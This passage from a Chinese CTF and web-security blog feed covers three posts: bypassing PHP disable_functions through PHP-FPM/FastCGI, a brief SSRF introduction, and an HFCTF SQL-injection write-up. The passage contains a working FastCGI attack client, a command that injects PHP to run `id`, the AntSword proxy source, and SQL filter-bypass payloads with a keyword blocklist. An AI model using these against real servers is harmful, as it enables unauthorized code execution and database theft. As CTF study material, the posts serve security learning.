class="hljs-number">128</span>:<br>            record += <span class="hljs-built_in">chr</span>(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += <span class="hljs-built_in">chr</span>(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + <span class="hljs-built_in">str</span>(name) + <span class="hljs-built_in">str</span>(value)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):</span><br>        <span class="hljs-comment"># 此函数对header进行解码</span><br>        <span class="hljs-comment"># 被用于__decodeFastCGIRecord函数的一部分</span><br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (<span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (<span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIRecord</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 此函数对record进行解码</span><br>        header = self.sock.recv(<span class="hljs-built_in">int</span>(FastCGIClient.__FCGI_HEADER_SIZE))<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                buffer = self.sock.recv(contentLength)<br>                <span class="hljs-keyword">while</span> contentLength <span class="hljs-keyword">and</span> buffer:<br>                    contentLength -= <span class="hljs-built_in">len</span>(buffer)<br>                    record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = self.sock.recv(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 区分多段Record.requestId作为同一次请求的标志</span><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-comment"># 构造header</span><br>        beginFCGIRecordContent = <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>                                 + <span class="hljs-built_in">chr</span>(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + <span class="hljs-built_in">chr</span>(self.keepalive) \<br>                                 + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br><br>        <span class="hljs-comment"># 构造body</span><br>        paramsRecord = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.iteritems():<br>                <span class="hljs-comment"># paramsRecord = self.__encodeNameValueParams(name, value)</span><br>                <span class="hljs-comment"># request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, post, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">&#x27;&#x27;</span>, requestId)<br>        <span class="hljs-comment"># 发送fast-cgi格式的包</span><br>        self.sock.send(request)<br>        self.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment"># 接受返回包</span><br>        <span class="hljs-keyword">return</span> self.__waitForResponse(requestId)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):</span><br>        <span class="hljs-comment"># 接受返回包</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br></code></pre></div></td></tr></table></figure><p>利用</p><blockquote><p>python fpm.py 127.0.0.1 -p 9000 /var/www/html/phpinfo.php -c ‘&lt;?php echo <code>id</code>;exit;?&gt;’</p></blockquote><p>也可看看蚁剑插件.antproxy.php的源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_client_header</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$headers</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$k</span>,<span class="hljs-string">&#x27;HTTP_&#x27;</span>)===<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$k</span>=strtolower(preg_replace(<span class="hljs-string">&#x27;/^HTTP/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$k</span>));<br>            <span class="hljs-variable">$k</span>=preg_replace_callback(<span class="hljs-string">&#x27;/_\w/&#x27;</span>,<span class="hljs-string">&#x27;header_callback&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=preg_replace(<span class="hljs-string">&#x27;/^_/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=str_replace(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$k</span>==<span class="hljs-string">&#x27;Host&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-variable">$headers</span>[]=<span class="hljs-string">&quot;<span class="hljs-subst">$k</span>:<span class="hljs-subst">$v</span>&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">header_callback</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> strtoupper(<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseHeader</span>(<span class="hljs-params"><span class="hljs-variable">$sResponse</span></span>)</span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>)=explode(<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>,<span class="hljs-variable">$sResponse</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$ret</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="hljs-variable">$sResponse</span>))&#123;<br>        <span class="hljs-variable">$ret</span>=parseHeader(<span class="hljs-variable">$sResponse</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>&#125;<br><br>set_time_limit(<span class="hljs-number">120</span>);<br><span class="hljs-variable">$headers</span>=get_client_header();<br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">61813</span>;<br><span class="hljs-variable">$errno</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$errstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$timeout</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;/index.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;?&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>&#125;;<br><br><span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;GET&quot;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;POST&quot;</span>;<br>    <span class="hljs-variable">$post_data</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$out</span> = <span class="hljs-variable">$method</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot; HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: &quot;</span>.<span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$port</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-Type: &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;<br>&#125;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-length:&quot;</span>.strlen(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<br><br><span class="hljs-variable">$out</span> .= implode(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$headers</span>);<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">$post_data</span>;<br><br>fputs(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br><br><span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=fread(<span class="hljs-variable">$fp</span>, <span class="hljs-number">4096</span>))&#123;<br>    <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$row</span>;<br>&#125;<br>fclose(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$response</span>, <span class="hljs-string">&quot;\r\n\r\n&quot;</span>);<br><span class="hljs-variable">$response</span> = substr(<span class="hljs-variable">$response</span>, <span class="hljs-variable">$pos</span>+<span class="hljs-number">4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br><br></code></pre></div></td></tr></table></figure><h4 id="PHP-FPM任意代码执行"><a href="#PHP-FPM任意代码执行" class="headerlink" title="PHP-FPM任意代码执行"></a>PHP-FPM任意代码执行</h4><p>参考文章<br><a href="_url"></a><a href="https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true">https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true</a><br><a href="_url"></a><a href="https://juejin.cn/post/6844903471976546311">https://juejin.cn/post/6844903471976546311</a><br><a href="_url"></a><a href="https://xz.aliyun.com/t/5598">https://xz.aliyun.com/t/5598</a><br><a href="_url"></a><a href="https://www.cnblogs.com/cjjjj/p/9844829.html">https://www.cnblogs.com/cjjjj/p/9844829.html</a><br><a href="_url"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><h2 id="UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等-1"><a href="#UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等-1" class="headerlink" title="- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等"></a>- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等</h2><p>这个地方漏洞原理与堆溢出有关，着实没看懂，直接用github现成的代码或者蚁剑绕过吧</p><p><a href="_url"></a><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><p>可参考文章<br><a href="_url"></a><a href="https://www.anquanke.com/post/id/195686#h3-6">https://www.anquanke.com/post/id/195686#h3-6</a><br><a href="_url"></a><a href="https://www.sohu.com/a/440546290_99907709">https://www.sohu.com/a/440546290_99907709</a></p>]]></content>
    
    
    <categories>
      
      <category>关于disabled_function的绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2021/05/15/2021-5-15-ssrf%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/15/2021-5-15-ssrf%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h3><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。</p><p>基础可参考<br><a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a><br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctfhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HFCTFhatenum</title>
    <link href="/2021/05/06/2021-5-6-%5BHFCTF%5Dhatenum/"/>
    <url>/2021/05/06/2021-5-6-%5BHFCTF%5Dhatenum/</url>
    
    <content type="html"><![CDATA[<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><h4 id="总结一下sql注入常见的绕过姿势"><a href="#总结一下sql注入常见的绕过姿势" class="headerlink" title="- 总结一下sql注入常见的绕过姿势"></a>- 总结一下sql注入常见的绕过姿势</h4><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="- 题目分析"></a>- 题目分析</h4><h4 id="编写exp"><a href="#编写exp" class="headerlink" title="- 编写exp"></a>- 编写exp</h4><hr><h3 id="关于sql注入的绕过姿势"><a href="#关于sql注入的绕过姿势" class="headerlink" title="关于sql注入的绕过姿势"></a>关于sql注入的绕过姿势</h3><h5 id="对于空格的绕过"><a href="#对于空格的绕过" class="headerlink" title="对于空格的绕过"></a>对于空格的绕过</h5><ul><li>换成 /**/ /<em>!</em>/</li><li>用编码绕过</li><li>加括号绕过</li></ul><h4 id="对于引号的绕过"><a href="#对于引号的绕过" class="headerlink" title="对于引号的绕过"></a>对于引号的绕过</h4><ul><li>用十六进制绕过<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></div></td></tr></table></figure>十六进制替换后<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></div></td></tr></table></figure></li></ul><h4 id="对于逗号的绕过"><a href="#对于逗号的绕过" class="headerlink" title="对于逗号的绕过"></a>对于逗号的绕过</h4><ul><li>可以用from或者offset来绕过</li></ul><h4 id="比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本"><a href="#比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本" class="headerlink" title="比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本"></a>比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本</h4><ul><li>可以使用greatest()、least（）（前者返回最大值，后者返回最小值）</li></ul><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><p>替换后为下面语句</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><h4 id="号的绕过"><a href="#号的绕过" class="headerlink" title="=号的绕过"></a>=号的绕过</h4><ul><li>可以用regexp，like等来替换</li></ul><h4 id="内联注释绕过："><a href="#内联注释绕过：" class="headerlink" title="内联注释绕过："></a>内联注释绕过：</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></code></pre></div></td></tr></table></figure><h4 id="通用绕过（编码）"><a href="#通用绕过（编码）" class="headerlink" title="通用绕过（编码）"></a>通用绕过（编码）</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>即<span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">31</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-number">31</span>，而Test也可以为<span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>)。<br></code></pre></div></td></tr></table></figure><hr><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="- 题目分析"></a>- 题目分析</h4><p>拿到源码审计后可以发现几乎将所有的可用的注入方法都过滤掉了，然而笨比我还企图绕过各种过滤进行insert的报错注入,也试过异或注入，但是各种注入都需要同时绕过一些标点符号，始终构造不出来，最终发现常规的注入不太现实。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hack detected&#x27;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>看到源码可以发现最重要的地方在于得到admin用户名的code，所以这个地方应该可以通过注入获得code的值，然后得到flag<br><img src="https://img-blog.csdnimg.cn/20210506120247504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>后来问了一下大佬才发现可以用exp(710)的溢出报错简单来说指数函数为对数函数的反函数，exp()即为以e为底的对数函数，但当传递一个大于709的值时，函数exp()就会引起一个溢出错误。并且还会用到rlike,rlike后面是正则语句，返回0或1，则可以构造 ==||exp(710-(… rlike … ))== 。 